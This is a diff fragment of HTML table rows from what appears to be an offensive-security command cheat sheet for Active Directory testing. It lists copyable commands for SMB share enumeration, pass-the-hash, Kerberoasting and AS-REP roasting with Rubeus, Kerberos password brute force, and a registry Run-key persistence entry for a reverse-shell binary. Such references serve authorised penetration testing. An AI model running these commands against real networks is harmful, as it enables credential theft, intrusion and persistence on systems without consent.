+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/" id="/wadcoms/SMBMap-Enum-Share-Anonymous/" style="text-decoration: none; color: DarkGreen;">python3 smbmap.py --host-file smb-hosts.txt -d test.local -L
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBMap-Enum-Share-Anonymous/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBMap-Enum-Share-Anonymous/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-Share-Anonymous/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBMap-Enum-File/" id="/wadcoms/SMBMap-Enum-File/" style="text-decoration: none; color: DarkGreen;">python3 smbmap.py --host-file smb-hosts.txt -u john -p &#39;password123&#39; -d test.local -F password
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBMap-Enum-File/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBMap-Enum-File/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBMap-Enum-File/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBClient-List-Shares/" id="/wadcoms/SMBClient-List-Shares/" style="text-decoration: none; color: DarkGreen;">smbclient -L \\test.local -I 10.10.10.1 -U john password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBClient-List-Shares/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBClient-List-Shares/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBClient-List-Shares-Anonymous/" id="/wadcoms/SMBClient-List-Shares-Anonymous/" style="text-decoration: none; color: DarkGreen;">smbclient -L \\test.local -I 10.10.10.1 -N
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBClient-List-Shares-Anonymous/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBClient-List-Shares-Anonymous/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares-Anonymous/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares-Anonymous/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares-Anonymous/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Shares-Anonymous/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBClient-List-Share-PTH/" id="/wadcoms/SMBClient-List-Share-PTH/" style="text-decoration: none; color: DarkGreen;">smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBClient-List-Share-PTH/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBClient-List-Share-PTH/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Share-PTH/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Share-PTH/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Share-PTH/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Share-PTH/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-List-Share-PTH/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBClient-Enum-Share/" id="/wadcoms/SMBClient-Enum-Share/" style="text-decoration: none; color: DarkGreen;">smbclient \\\\test.local\\C$ -I 10.10.10.1 -U john password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBClient-Enum-Share/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBClient-Enum-Share/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/SMBClient-Enum-Share-Anonymous/" id="/wadcoms/SMBClient-Enum-Share-Anonymous/" style="text-decoration: none; color: DarkGreen;">smbclient \\\\test.local\\public -I 10.10.10.1 -N
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/SMBClient-Enum-Share-Anonymous/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/SMBClient-Enum-Share-Anonymous/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share-Anonymous/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share-Anonymous/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share-Anonymous/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/SMBClient-Enum-Share-Anonymous/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Rubeus-Kerberoast/" id="/wadcoms/Rubeus-Kerberoast/" style="text-decoration: none; color: DarkGreen;">Rubeus.exe kerberoast /outfile:hashes.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Rubeus-Kerberoast/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Rubeus-Kerberoast/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Kerberoast/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Kerberoast/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Kerberoast/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Kerberoast/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Kerberoast/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Rubeus-Brute/" id="/wadcoms/Rubeus-Brute/" style="text-decoration: none; color: DarkGreen;">Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Rubeus-Brute/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Rubeus-Brute/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Brute/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Brute/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Brute/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-Brute/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Rubeus-AskTGT/" id="/wadcoms/Rubeus-AskTGT/" style="text-decoration: none; color: DarkGreen;">Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Rubeus-AskTGT/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Rubeus-AskTGT/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-AskTGT/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-AskTGT/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-AskTGT/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-AskTGT/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-AskTGT/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Rubeus-ASREPRoast/" id="/wadcoms/Rubeus-ASREPRoast/" style="text-decoration: none; color: DarkGreen;">Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Rubeus-ASREPRoast/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Rubeus-ASREPRoast/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-ASREPRoast/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-ASREPRoast/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-ASREPRoast/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-ASREPRoast/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Rubeus-ASREPRoast/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Responder-Analyze/" id="/wadcoms/Responder-Analyze/" style="text-decoration: none; color: DarkGreen;">Responder -I eth0 -A
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Responder-Analyze/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Responder-Analyze/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Responder-Analyze/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Regexe-Persistence/" id="/wadcoms/Regexe-Persistence/" style="text-decoration: none; color: DarkGreen;">reg.exe add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Persistence /t REG_SZ /d &quot;C:\Path\To\revshell.exe&quot;
+
+reg.exe add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Persistence /t REG_SZ /d &quot;C:\Path\To\revshell.exe&quot;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Regexe-Persistence/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Regexe-Persistence/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Regexe-Persistence/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Regexe-Persistence/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Regexe-Persistence/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/RPCClient-Anonymous/" id="/wadcoms/RPCClient-Anonymous/" style="text-decoration: none; color: DarkGreen;">rpcclient -U &#39;&#39; -N 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/RPCClient-Anonymous/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/RPCClient-Anonymous/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/RPCClient-Anonymous/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/RPCClient-Anonymous/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/RPCClient-Anonymous/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/RPCClient-Anonymous/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PyWhisker/" id="/wadcoms/PyWhisker/" style="text-decoration: none; color: DarkGreen;">python3 pywhisker.py -d &quot;test.local&quot; -u &quot;john&quot; -p &quot;password123&quot; --target &quot;user2&quot; --action &quot;list&quot; --dc-ip &quot;10.10.10.1&quot;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PyWhisker/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PyWhisker/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyWhisker/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyWhisker/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyWhisker/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyWhisker/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyWhisker/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PyLDAPmonitor/" id="/wadcoms/PyLDAPmonitor/" style="text-decoration: none; color: DarkGreen;">python3 ldapmonitor.py -u &#39;john&#39; -d &#39;TEST.local&#39; -p &#39;password123&#39; --dc-ip 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PyLDAPmonitor/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PyLDAPmonitor/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PyLDAPmonitor/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PowerView-Get-DomainUser/" id="/wadcoms/PowerView-Get-DomainUser/" style="text-decoration: none; color: DarkGreen;">Get-DomainUser -Domain test.local -DomainController 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PowerView-Get-DomainUser/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PowerView-Get-DomainUser/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PowerView-Get-DomainUser-ASREP/" id="/wadcoms/PowerView-Get-DomainUser-ASREP/" style="text-decoration: none; color: DarkGreen;">Get-DomainUser -Domain test.local -DomainController 10.10.10.1 -PreauthNotRequired -Properties SamAccountName
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PowerView-Get-DomainUser-ASREP/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PowerView-Get-DomainUser-ASREP/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser-ASREP/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser-ASREP/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainUser-ASREP/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PowerView-Get-DomainGroupMember/" id="/wadcoms/PowerView-Get-DomainGroupMember/" style="text-decoration: none; color: DarkGreen;">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain test.local -DomainController 10.10.10.1
